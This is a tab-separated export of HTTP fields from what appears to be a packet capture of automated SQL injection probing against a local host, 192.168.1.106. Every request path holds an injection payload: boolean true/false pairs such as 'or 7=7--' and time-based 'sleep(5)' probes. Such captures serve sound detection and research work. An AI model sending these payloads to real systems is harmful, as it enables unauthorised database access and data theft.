http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																											192.168.1.106									228						1	http://192.168.1.106/webxxx%22%20or%207%3d7--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%207%3d7--
																											192.168.1.106									229						1	http://192.168.1.106/webxxx%22%20or%205%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%205%3d8--
																											192.168.1.106									230						1	http://192.168.1.106/webxxx%22%20or%20%22s%22%3d%22s		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22s%22%3d%22s
																											192.168.1.106									231						1	http://192.168.1.106/webxxx%22%20or%20%22s%22%3d%22r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22s%22%3d%22r
																											192.168.1.106									232						1	http://192.168.1.106/webxxx%22%20or%20%22t%22%3d%22t		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22t%22%3d%22t
																											192.168.1.106									233						1	http://192.168.1.106/webxxx%22%20or%20%22t%22%3d%22r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/webxxx%22%20or%20%22t%22%3d%22r
																											192.168.1.106									235						1	http://192.168.1.106/21%20or%208%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/21%20or%208%3d8--
																											192.168.1.106									236						1	http://192.168.1.106/21%20or%207%3d5--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/21%20or%207%3d5--
																											192.168.1.106									238						1	http://192.168.1.106/21%20or%207%3d7--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/21%20or%207%3d7--
																											192.168.1.106									239						1	http://192.168.1.106/21%20or%205%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/21%20or%205%3d8--
																											192.168.1.106									240						1	http://192.168.1.106/web'%20and%208%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%208%3d8--
																											192.168.1.106									241						1	http://192.168.1.106/web'%20and%207%3d5--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%207%3d5--
																											192.168.1.106									242						1	http://192.168.1.106/web'%20and%207%3d7--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%207%3d7--
																											192.168.1.106									243						1	http://192.168.1.106/web'%20and%205%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%205%3d8--
																											192.168.1.106									244						1	http://192.168.1.106/web'%20and%20's'%3d's		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%20's'%3d's
																											192.168.1.106									245						1	http://192.168.1.106/web'%20and%20's'%3d'r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%20's'%3d'r
																											192.168.1.106									246						1	http://192.168.1.106/web'%20and%20't'%3d't		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%20't'%3d't
																											192.168.1.106									247						1	http://192.168.1.106/web'%20and%20't'%3d'r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web'%20and%20't'%3d'r
																											192.168.1.106									248						1	http://192.168.1.106/web%22%20and%208%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%208%3d8--
																											192.168.1.106									249						1	http://192.168.1.106/web%22%20and%207%3d5--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%207%3d5--
																											192.168.1.106									250						1	http://192.168.1.106/web%22%20and%207%3d7--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%207%3d7--
																											192.168.1.106									251						1	http://192.168.1.106/web%22%20and%205%3d8--		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%205%3d8--
																											192.168.1.106									252						1	http://192.168.1.106/web%22%20and%20%22s%22%3d%22s		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%20%22s%22%3d%22s
																											192.168.1.106									254						1	http://192.168.1.106/web%22%20and%20%22s%22%3d%22r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%20%22s%22%3d%22r
																											192.168.1.106									255						1	http://192.168.1.106/web%22%20and%20%22t%22%3d%22t		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%20%22t%22%3d%22t
																											192.168.1.106									256						1	http://192.168.1.106/web%22%20and%20%22t%22%3d%22r		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web%22%20and%20%22t%22%3d%22r
																											192.168.1.106									257						1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106									258						1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106									259						1	http://192.168.1.106/sleep(5)%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/sleep(5)%23
																											192.168.1.106									260						1	http://192.168.1.106/1%20or%20sleep(5)%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/1%20or%20sleep(5)%23
																											192.168.1.106									261						1	http://192.168.1.106/%22%20or%20sleep(5)%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%20or%20sleep(5)%23
																											192.168.1.106									262						1	http://192.168.1.106/'%20or%20sleep(5)%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%20or%20sleep(5)%23
																											192.168.1.106									264						1	http://192.168.1.106/%22%20or%20sleep(5)%3d%22		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%20or%20sleep(5)%3d%22
																											192.168.1.106									265						1	http://192.168.1.106/'%20or%20sleep(5)%3d'		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%20or%20sleep(5)%3d'
